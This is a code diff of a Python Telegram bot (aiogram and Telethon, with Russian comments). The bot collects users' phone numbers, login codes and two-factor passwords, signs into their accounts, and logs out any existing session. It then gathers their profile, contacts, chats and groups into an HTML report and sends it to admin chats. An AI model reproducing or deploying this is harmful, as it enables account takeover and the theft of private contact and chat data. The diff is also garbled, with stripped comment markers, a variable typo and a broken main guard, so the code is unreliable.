@@ -6,7 +6,6 @@ from aiogram.utils import executor
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from telethon import TelegramClient
 from dotenv import load_dotenv
-from defunc import *
 from telethon.errors import SessionPasswordNeededError
 from datetime import datetime
 
@@ -22,8 +21,7 @@ admin_chat_ids_str = os.getenv("ADMIN_CHAT_IDS")
 allowed_users = [int(user_id) for user_id in allowed_users_str.split(",")]
 admin_chat_ids = [int(chat_id) for chat_id in admin_chat_ids_str.split(",")]
 
-# Создаем TelegramClient и Bot
-client = TelegramClient('session_name', api_id, api_hash)
+# Создаем Bot и Dispatcher
 bot = Bot(token=bot_token)
 dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
@@ -79,12 +77,13 @@ async def get_phone_number(message: types.Message):
     user_state[message.from_user.id] = {'phone_number': phone_number}
     
     try:
+        # Создаем новый экземпляр клиента
+        client = create_client()
         await client.connect()
         
-        # Проверка, авторизован ли пользователь
+        # Разлогиниваемся от предыдущего клиента, если он был авторизован
         if await client.is_user_authorized():
-            await message.reply("Вы уже авторизованы.")
-            return
+            await client.log_out()
         
         phone_code_hash = await client.send_code_request(phone_number)
         user_state[message.from_user.id]['phone_code_hash'] = phone_code_hash
@@ -101,6 +100,8 @@ async def get_code(message: types.Message):
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
 
     try:
+        # Создаем новый экземпляр клиента
+        client = create_client()
         await client.connect()
         
         # Проверяем, что пин-код состоит из 5 цифр
@@ -113,7 +114,7 @@ async def get_code(message: types.Message):
         await process_user_data(client, phone_number, message.from_user.id)
     except SessionPasswordNeededError:
         await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
-        user_state[message.from_user.id]['awaiting_password'] = True
+        userstate[message.from_user.id]['awaiting_password'] = True
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
     finally:
@@ -125,9 +126,11 @@ async def process_password(message: types.Message):
     password = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
-
     try:
+        # Создаем новый экземпляр клиента
+        client = create_client()
         await client.connect()
+        
         await client.sign_in(phone_number=phone_number, password=password, phone_code_hash=phone_code_hash.phone_code_hash)
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
@@ -138,15 +141,28 @@ async def process_password(message: types.Message):
         await client.disconnect()
         user_state.pop(message.from_user.id, None)
 
-# Функция для создания нового экземпляра клиента
+Функция для создания нового экземпляра клиента
+
 def create_client():
     return TelegramClient('session_name', api_id, api_hash)
+    Функция для обработки данных пользователя
 
-# Функция для обработки данных пользователя
 async def process_user_data(client, phone_number, user_id):
-    # Здесь можно добавить логику обработки данных пользователя
-    pass
+    selection = '0'
+    try:
+        userid, userinfo, firstname, lastname, username = await get_user_info(client, phone_number, selection)
+        count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html = await get_blocked_bot(client, selection)
+        delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html = await get_type_of_chats(client, selection)
+        groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
+        total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userinfo, userid)
+        await save_about_channels(phone_number, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)
+        await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html, user_id)
+        await send_files_to_bot(bot, admin_chat_ids, user_id)
+    except Exception as e:
+        await client.disconnect()
+        raise e
+        
+Запуск бота
 
-# Запуск бота
-if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True)
+if name == 'main':
+executor.start_polling(dp, skip_updates=True)
